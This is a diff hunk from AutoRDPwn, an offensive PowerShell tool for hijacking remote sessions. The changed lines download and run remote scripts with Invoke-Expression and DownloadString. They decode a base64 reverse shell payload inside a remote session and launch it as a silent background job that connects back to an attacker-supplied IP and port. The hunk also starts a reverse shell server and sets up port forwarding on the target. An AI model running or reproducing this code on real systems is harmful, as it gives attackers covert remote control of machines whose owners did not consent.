@@ -693,7 +693,8 @@ Invoke-PipeShell -mode client -server $computer -aeskey AutoRDPwn_AESKey -i -pip
 if ($revshell){ Write-Host ; Write-Host "[+] Downloading HTTP-RevShell Server.." -ForegroundColor Blue
 if($local){ Import-Module .\Resources\Scripts\Invoke-RevShellServer.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-RevShellServer.ps1')}
 if($local){ Import-Module .\Resources\Scripts\Invoke-WebRev.ps1 } else { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-WebRev.ps1')}
-invoke-command -session $RDP[0] -scriptblock { $webrevscript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$using:webrev64")) ; Set-Content -Value $webrevscript -Path Invoke-WebRev.ps1 ; Import-Module .\Invoke-WebRev.ps1 ; Invoke-WebRev -ip $using:webrevip -port $using:webrevport }
+invoke-command -session $RDP[0] -scriptblock { Start-Job -ScriptBlock { $webrevscript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$using:webrev64")) ; Set-Content -Value $webrevscript -Path Invoke-WebRev.ps1
+Import-Module .\Invoke-WebRev.ps1 ; Invoke-WebRev -ip $using:webrevip -port $using:webrevport } 2>&1> $null }
 try { Clear-Host ; .\server.exe $webrevip $webrevport ; del .\server.exe } finally { Write-Host ; Write-Host "[!] Ctrl+C pressed, exiting.." -ForegroundColor Red ; Start-Sleep -milliseconds 2000 ; del .\server.exe }}
 
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
